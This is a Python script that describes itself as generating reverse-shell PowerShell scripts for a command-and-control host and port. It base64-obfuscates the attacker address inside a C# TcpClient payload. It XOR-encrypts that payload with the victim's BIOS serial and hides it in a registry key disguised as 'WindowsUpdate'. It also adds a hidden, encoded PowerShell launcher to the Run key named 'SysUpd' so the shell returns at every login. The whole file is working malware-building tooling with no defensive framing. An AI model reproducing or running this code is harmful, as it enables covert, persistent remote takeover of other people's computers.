import argparse, base64, os, random, uuid, re

NAMES = ["Alpha","Beta","Charlie","Delta","Echo","Foxtrot","Golf","Hotel",
         "India","Juliet","Kilo","Lima","Mike","November","Oscar","Papa",
         "Quebec","Romeo","Sierra","Tango","Uniform","Victor","Whiskey",
         "Xray","Yankee","Zulu"]

def pick_folder():
    names = NAMES.copy()
    random.shuffle(names)
    for name in names:
        if not os.path.exists(name):
            return name
    return uuid.uuid4().hex


def obfuscate_addr(host, port):
    segs = host.split('.')
    dot_enc = base64.b64encode(b'.').decode()
    parts = []
    for seg in segs:
        enc_seg = base64.b64encode(seg.encode()).decode()
        parts.append(f'M_mgbkf("{enc_seg}")')
        parts.append(f'M_mgbkf("{dot_enc}")')
    parts = parts[:-1]
    obf_host = '+'.join(parts)
    port_enc = base64.b64encode(str(port).encode()).decode()
    obf_port = f'int.Parse(M_mgbkf("{port_enc}"))'
    return obf_host, obf_port


def generate_shell(host, port, payload_path="payload.cs"):
    if not os.path.exists(payload_path):
        print(f"Error: {payload_path} not found.")
        return
    with open(payload_path, 'r', encoding='utf-8') as f:
        payload = f.read()
    payload = payload.replace("args.Data", "P_Mfsuqp.Data")
    m = re.search(r'public\s+class\s+(\w+)', payload)
    cls = m.group(1) if m else 'C_ahpOiS'

    # Obfuscate host and port for payload
    obf_host, obf_port = obfuscate_addr(host, port)
    payload, count = re.subn(
        r'new\s+TcpClient\s*\([^)]*\)',
        f'new TcpClient({obf_host}, {obf_port})',
        payload, count=1
    )
    if count == 0:
        print("Warning: TcpClient pattern not found in payload.")

    # Base64-encode the modified C# payload for storage
    enc_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

    # Build the PS stub that will decrypt and execute the payload (using working format)
    exec_cmd = (
        "$k=(gwmi Win32_BIOS).SerialNumber.Trim();"
        "$e=(gp HKCU:\\Software\\WindowsUpdate).DataCache;"
        "$b=[Convert]::FromBase64String($e);"
        "$p=[Text.Encoding]::UTF8.GetBytes($k);"
        "for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor$p[$i%$p.Length]};"
        "Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString($b)) -Language CSharp;"
        f"[{cls}]::Start()"
    )

    # Encode the PS stub as UTF-16LE for -EncodedCommand
    stub_enc = base64.b64encode(exec_cmd.encode('utf-16le')).decode('utf-8')

    # Build the raw PowerShell command for registry Run: hidden child + exit parent using stub_enc
    raw_cmd = (
        f"powershell.exe -NoProfile -WindowStyle Hidden -Command \""
        f"Start-Process powershell.exe -ArgumentList '-NoProfile -WindowStyle Hidden -EncodedCommand {stub_enc}' -WindowStyle Hidden\" & exit"
    )
    # Escape any single quotes for embedding in a single-quoted literal
    reg_cmd = raw_cmd.replace("'", "''")

    # Build setup script: writes C# payload to registry then sets Run key to exec stub
    setup = f"$k=(gwmi Win32_BIOS).SerialNumber.Trim();"
    setup += f"$kb=[Text.Encoding]::UTF8.GetBytes($k);"
    setup += f"$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{enc_payload}'));"
    setup += "$b=[Text.Encoding]::UTF8.GetBytes($s);"
    setup += "for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor$kb[$i%$kb.Length]};"
    setup += "ni HKCU:\\Software\\WindowsUpdate -Force;"
    setup += "sp HKCU:\\Software\\WindowsUpdate DataCache ([Convert]::ToBase64String($b));"
    setup += f"sp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run SysUpd '{reg_cmd}'"

    folder = pick_folder()
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, "smaller_setup.ps1"), "w", encoding='utf-8') as f:
        f.write(setup)
    with open(os.path.join(folder, "small_execute.ps1"), "w", encoding='utf-8') as f:
        f.write(exec_cmd)

    print(f"Generated in folder: {folder}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate reverse shell PS1 scripts integrated with registry Run logic")
    parser.add_argument("-H", "--host", required=True, help="C2 host/IP")
    parser.add_argument("-P", "--port", required=True, help="C2 port")
    parser.add_argument("-f", "--file", default="payload.cs", help="Path to payload.cs")
    args = parser.parse_args()
    generate_shell(args.host, args.port, args.file)
